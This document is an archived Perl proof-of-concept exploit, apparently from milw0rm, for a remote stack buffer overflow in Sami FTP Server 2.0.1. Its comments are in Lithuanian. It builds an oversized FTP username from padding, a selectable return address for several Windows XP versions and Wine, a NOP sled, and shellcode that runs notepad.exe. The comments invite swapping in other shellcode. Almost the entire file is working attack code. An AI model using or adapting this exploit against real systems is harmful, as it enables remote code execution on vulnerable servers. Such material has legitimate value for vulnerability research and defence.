<html><head><title>Sami FTP Server 2.0.1 Remote Stack Based Buffer Overflow PoC</title></head><pre>#!/usr/bin/perl
# Sami FTP Server v2.0.1 Remote notepad.exe execution PoC by Critical Security research http://www.critical.lt
# Tested on Windows XP SP2, Windows XP SP0 and even on FreeBSD 6.0-RELEASE Wine 0.9.6 :))

use Net::FTP;                 # &lt;- jo, að tinginys :)
use Switch;

if (@ARGV &lt; 3) {
print &quot;--------------------------------------------------------------------\n&quot;;
print &quot;Usage : exploit.pl -hVictimsIPAddress -yYourIPAddress -oOffsetNumber\n&quot;;
print &quot; Offsets: \n&quot;;
print &quot; 1 - 0x76B43AE0 Windows XP SP2 winmm.dll call esp\n&quot;;
print &quot; 2 - 0x76B5D17B Windows XP SP1 winmm.dll call esp\n&quot;;
print &quot; 3 - 0x71AB7BFB Windows XP SP0 ws2_32.dll jmp esp\n&quot;;
print &quot; 4 - 0x9C2295DF FreeBSD 6.0-RELEASE Wine 0.9.6  kernel32.dll jmp esp\n&quot;;
print &quot; If values not specified, default values will be used.\n&quot;;
print &quot; Example : ./eploit.pl -h127.0.0.1 -y127.0.0.1 -o1\n&quot;;
print &quot;--------------------------------------------------------------------\n&quot;;
}
$host =   &quot;127.0.0.1&quot;;        # aukos ip
$yourip = &quot;127.0.0.1&quot; ;       # Reikalingas tam, kad bûtø galima sulyginti ðelkodà, nes i steka ásiraðo ir jusu ip adresas, todel áraðykit savo iðorini (jei neturit tokio - gateway ip)
$offset = &quot;\xE0\x3A\xB4\x76&quot;; # defaultinis offsetas á winmm.dll esantá call esp   (WinXP SP 2)

foreach (@ARGV) {
$host = $1 if ($_=~/-h((.*)\.(.*)\.(.*)\.(.*))/);
$yourip = $1 if ($_=~/-y((.*)\.(.*)\.(.*)\.(.*))/);
$offset = $1 if ($_=~/-o(.*)/);
}
#offsetø suradimui naudokit findjmp.exe arba metasploit.com opcodø db ;)  (call esp/jmp esp..)
switch ($offset) {
case 1 { $offset = &quot;\xE0\x3A\xB4\x76&quot; } # Windows XP SP2 winmm.dll call esp
case 2 { $offset = &quot;\x7B\xD1\xB5\x76&quot; } # Windows XP SP1 winmm.dll call esp
case 3 { $offset = &quot;\xFB\x7B\xAB\x71&quot; } # Windows XP SP0 ws2_32.dll jmp esp
case 4 { $offset = &quot;\xDF\x95\x22\x9C&quot; } # FreeBSD 6.0-RELEASE Wine 0.9.6  kernel32.dll jmp esp
}

foreach $letter (split '', $yourip) { $c++;};
$ftp = Net::FTP-&gt;new($host, Debug =&gt; 0)  or die &quot;Cannot connect: $@&quot;;
$user = &quot;A&quot; x 213 . # vaþiuojam iki returno :O  (cia irgi galima kiðt ðelkodà :) )
&quot;A&quot; x (15 - $c)   . # dar keli baitai sulyginimui, nes á stekà taip pat ásiraðo ir ip adresas, todël reikia pagal já paskaièiuot, kur raðyt ret adresà
$offset .           # ret adresas á kokio dll'o call esp  ar jmp esp, ar ka nors panaðaus svarbu, kad nuðoktume á esp ;)
&quot;\x90&quot; x 25 .       # nop'ø sled'as, kad sulygintume su esp esanèiu adresu

# ðelkodas paleidþiantis notepadà (ðelkodas skirtas tiem kas sakë, jog critical mëgsta DoS :*) - norësit, ásidësit normalø..
&quot;\xCD\x03&quot;.
&quot;\xEB\x61\x56\x6A\x30\x59\x64\x8B\x01\x8B\x40\x0C&quot;.
&quot;\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\xC3\x60\x8B\x6C&quot;.
&quot;\x24\x24\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B&quot;.
&quot;\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34&quot;.
&quot;\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74&quot;.
&quot;\x07\xC1\xCF\x0D\x01\xC7\xEB\xF4\x3B\x7C\x24\x28&quot;.
&quot;\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B&quot;.
&quot;\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24&quot;.
&quot;\x1C\x61\xC3\xE8\x9A\xFF\xFF\xFF\x68\x98\xFE\x8A&quot;.
&quot;\x0E\x50\xE8\xA2\xFF\xFF\xFF\xEB\x02\xEB\x05\xE8&quot;.
&quot;\xF9\xFF\xFF\xFF\x5B\x83\xC3\x1C\x33\xC9\x88\x0B&quot;.
&quot;\x83\xEB\x0B\x41\x51\x53\xFF\xD0\x90\x6E\x6F\x74&quot;.
&quot;\x65\x70\x61\x64\x2E\x65\x78\x65\x01&quot;;
$ftp-&gt;login(&quot;$user&quot;,&quot;biatch&quot;);

# milw0rm.com [2006-01-25]</pre></html>